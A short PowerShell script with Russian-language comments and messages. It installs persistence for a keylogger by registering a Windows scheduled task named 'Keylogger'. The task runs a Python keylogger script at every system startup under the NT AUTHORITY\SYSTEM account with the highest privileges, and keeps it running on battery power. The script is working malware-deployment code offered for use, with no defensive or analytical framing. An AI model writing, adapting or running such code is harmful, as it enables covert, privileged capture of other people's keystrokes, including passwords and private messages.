param (
    [string]$TaskName = "Keylogger",
    [string]$PythonPath = "C:\Path\To\python.exe",
    [string]$ScriptPath = "C:\Path\To\keylogger.py"
)

# Проверка наличия Python
if (!(Test-Path $PythonPath)) {
    Write-Host "Ошибка: Python не найден по пути $PythonPath" -ForegroundColor Red
    exit
}

# Проверка наличия скрипта
if (!(Test-Path $ScriptPath)) {
    Write-Host "Ошибка: Скрипт не найден по пути $ScriptPath" -ForegroundColor Red
    exit
}

# Создание команды для выполнения
$Action = New-ScheduledTaskAction -Execute $PythonPath -Argument "`"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Создание задачи
try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "NT AUTHORITY\SYSTEM" -RunLevel Highest
    Write-Host "Задача '$TaskName' успешно создана!" -ForegroundColor Green
} catch {
    Write-Host "Ошибка при создании задачи: $_" -ForegroundColor Red
}
